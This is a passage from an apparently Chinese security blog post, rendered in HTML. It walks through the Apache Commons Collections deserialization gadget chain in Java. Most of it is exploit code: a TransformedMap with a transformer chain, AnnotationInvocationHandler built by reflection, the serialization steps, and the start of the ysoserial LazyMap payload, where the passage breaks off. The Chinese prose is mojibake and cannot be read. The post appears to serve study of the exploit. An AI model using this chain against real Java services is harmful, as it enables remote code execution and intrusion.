&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»…æœ‰demoçš„ä»£ç ä¸è¶³ä»¥æ„é€ å®Œå…¨å¯ç”¨çš„pocï¼Œå®é™…çš„ååºåˆ—åŒ–ä¸­ï¼Œä¸åŒäºæ‰‹å·¥æ‰§è¡ŒouterMap.put()ï¼Œæˆ‘ä»¬ç¦»ä¸å¼€ä¸€ä¸ªåˆé€‚çš„&lt;code>readObject&lt;/code>è§¦å‘&lt;code>outerMap.put&lt;/code>-&amp;gt;&lt;code>transform&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œç”¨åˆ°çš„æ˜¯&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>ï¼Œçœ‹ä¸€ä¸‹å®ƒçš„&lt;code>readObject&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AnnotationType&lt;/span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">AnnotationType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalArgumentException&lt;/span> &lt;span style="color:#111">var9&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Non-annotation type in annotation serial stream&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">memberTypes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Iterator&lt;/span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">memberValues&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">entrySet&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">iterator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Entry&lt;/span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">var6&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!(&lt;/span>&lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">ExceptionProxy&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setValue&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AnnotationTypeMismatchExceptionProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;[&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;]&amp;#34;&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">setMember&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Method&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">members&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»£ç æ¯”è¾ƒå¥½çœ‹æ‡‚ï¼Œå…ˆæ˜¯å¾—åˆ°å‰é¢ä¼ å…¥çš„Mapï¼ˆæˆ‘ä»¬ä¼ å…¥ç»è¿‡TransformedMapä¿®é¥°çš„å¯¹è±¡ï¼‰ï¼Œä¹‹åä¾æ¬¡éå†ï¼Œåˆ°äº†&lt;code>setValue&lt;/code>æ—¶ä¼šè§¦å‘transformçš„å›è°ƒ&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬æ„é€ POCæ—¶éœ€è¦åˆ›å»º&lt;code>AnnotationInvocationHandler&lt;/code>å¯¹è±¡ï¼Œå¹¶æŠŠå‰é¢çš„&lt;code>HashMap&lt;/code>ä¼ è¿›æ¥ä½œä¸ºMapå‚æ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŒæ—¶å› ä¸ºAnnotationInvocationHandleræ˜¯å†…éƒ¨ç±»ä¸èƒ½ç›´æ¥newï¼Œæˆ‘ä»¬ç”¨åå°„+setAccessible(true)çš„æ–¹å¼å®ä¾‹åŒ–ï¼›å¹¶ä¸”ç”±äº&lt;code>Runtime.getRuntime&lt;/code>æ²¡æœ‰å®ç°åºåˆ—åŒ–çš„æ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åå°„è·å–å½“å‰ä¸Šä¸‹æ–‡çš„Runtimeå¯¹è±¡&lt;/p>
&lt;p>å¦å¤–ï¼Œä¸ºäº†æ»¡è¶³readObjectä¸­çš„&lt;code>var7!=null&lt;/code>çš„åˆ¤æ–­ï¼Œè¦æ»¡è¶³&lt;/p>
&lt;ul>
&lt;li>&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºAnnotationçš„å­ç±»ï¼Œä¸”å¿…é¡»è‡³å°‘å«æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾æ–¹æ³•åä¸ºX&lt;/li>
&lt;li>è¢«&lt;code>TransformedMap.decorate&lt;/code>ä¿®é¥°çš„Mapä¸­å¿…æœ‰ä¸€ä¸ªé”®åä¸ºXçš„å…ƒç´ &lt;/li>
&lt;/ul>
&lt;p>8u71ä¹‹åçš„ç‰ˆæœ¬ä¿®æ”¹äº†&lt;code>AnnotationInvocationHandler&lt;/code>çš„readObjectå‡½æ•°ï¼Œä¸å†ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†LinkedHashMapå¯¹è±¡ï¼ŒæŠŠåŸæ¥çš„key-valueæ·»åŠ è¿›å»ï¼Œæ‰€ä»¥åç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ª&lt;code>LinkedHashMap&lt;/code>å¯¹è±¡ï¼Œä¸ä¼šå†è§¦å‘setæˆ–putäº†&lt;/p>
&lt;p>æœ€åæŠŠå¯¹è±¡ç”Ÿæˆåºåˆ—åŒ–æµ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="lazymap">LazyMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.Authors&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.Dependencies&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.annotation.PayloadTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Gadgets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.JavaVersion&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.PayloadRunner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Reflections&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Gadget chain:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ObjectInputStream.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> AnnotationInvocationHandler.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Map(Proxy).entrySet()
